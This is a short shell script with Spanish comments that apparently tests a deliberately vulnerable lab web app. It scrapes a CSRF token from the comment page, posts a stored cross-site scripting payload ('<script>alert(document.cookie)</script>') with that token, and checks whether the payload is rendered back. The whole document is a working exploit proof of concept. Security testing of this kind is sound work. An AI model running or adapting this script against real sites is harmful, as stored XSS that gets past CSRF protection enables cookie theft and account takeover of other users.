#!/bin/sh
set -e

# 1. Obtener cookie de sesion/antiforgery y token CSRF de la pagina
curl -s -c /tmp/cookies.txt http://vulnerable-app:8080/Comment/Index -o /tmp/page.html

TOKEN=$(sed -n 's/.*name="__RequestVerificationToken" type="hidden" value="\([^"]*\)".*/\1/p' /tmp/page.html)

echo "TOKEN capturado: $TOKEN"
echo "-----------------------------------"

# 2. Enviar el payload XSS con el token valido
curl -s -i -b /tmp/cookies.txt -X POST http://vulnerable-app:8080/Comment/AddComment \
  --data-urlencode "comment=<script>alert(document.cookie)</script>" \
  --data-urlencode "__RequestVerificationToken=$TOKEN"

echo ""
echo "-----------------------------------"
echo "Respuesta final de /Comment/Index:"
echo "-----------------------------------"

# 3. Ver como quedo almacenado y renderizado el comentario
curl -s http://vulnerable-app:8080/Comment/Index | grep -i "alert(document.cookie)" || echo "No se encontro el payload en la respuesta"